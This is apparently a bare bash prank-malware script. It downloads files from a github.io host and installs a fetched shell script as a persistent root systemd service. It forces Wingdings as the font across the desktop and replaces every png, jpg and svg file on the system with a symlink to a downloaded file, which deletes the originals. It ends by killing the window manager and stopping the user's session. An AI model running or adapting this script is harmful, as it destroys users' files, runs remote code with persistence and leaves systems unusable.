trap '' HUP

N=goog
sudo mkdir -p /opt/$N
cd /opt/$N
dl() { 
  sudo curl -fsSL geodebreaker.github.io/mystuff/$N.$1 -o $N.$1 
}

persist() {
  dl wav
  dl s.sh
  sed -i "s/\$N/$N/g" $N.s.sh
  cp $N.s.sh /usr/local/bin/$N
  chmod +x /usr/local/bin/$N
  cat >/etc/systemd/system/$N.service <<EOF
[Unit]
Description=$N
After=network.target
[Service]
ExecStart=bash /usr/local/bin/$N
Restart=always
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload
  systemctl enable --now $N
  echo "Installed service"
  sleep 30
  systemctl start $N
  if command -v kwin; then
    pkill -x kwin_wayland; pkill -x kwin_x11
  fi
}

font() {
  dl ttf
  sudo mkdir -p /usr/local/share/fonts/TTF
  sudo cp $N.ttf /usr/local/share/fonts/TTF/
  sudo bash -c "cat > '/etc/fonts/conf.d/99-global-font.conf'" <<EOF
<?xml version="1.0"?>
<!DOCTYPE fontconfig SYSTEM "fonts.dtd">
<fontconfig>
  <match target="pattern">
    <edit name="family" mode="assign" binding="strong">
      <string>Wingdings</string>
    </edit>
  </match>
</fontconfig>
EOF
  sudo fc-cache -fvr
  U=${SUDO_USER:-$USER}
  sudo -u $U gsettings set org.gnome.desktop.interface font-name 'Wingdings 11'
  sudo -u $U gsettings set org.gnome.desktop.interface monospace-font-name 'Wingdings 11'
  sudo -u $U kwriteconfig5 --file kdeglobals --group General --key font "Wingdings,11,-1,5,50,0,0,0,0,0"
  sudo -u $U kwriteconfig5 --file kdeglobals --group General --key fixed "Wingdings,11,-1,5,50,0,0,0,0,0"
  sudo -u $U kwriteconfig5 --file kdeglobals --group General --key menuFont "Wingdings,11,-1,5,50,0,0,0,0,0"
  sudo -u $U kwriteconfig5 --file kdeglobals --group General --key toolBarFont "Wingdings,11,-1,5,50,0,0,0,0,0"
  sudo -u $U kwriteconfig5 --file kdeglobals --group General --key smallFont "Wingdings,11,-1,5,50,0,0,0,0,0"
  sleep 5
  sudo fc-cache -fvr
}

fun() {
  rm -f "$1"
  ln -s "$goof" "$1"
}

goog() {
  dl $1
  goof=$PWD/$N.$1
  sudo find / -type f -iname "*.$1" -not -path "$goof" -print0 2>/dev/null \
    | while IFS= read -r -d '' file; do (fun $file &); sleep 0.001; done
  echo "[+]"
  echo "[+] $1"
  echo "[+]"
}

font &
goog png
goog jpg
goog svg
persist
sleep 30
sudo systemctl stop user@1000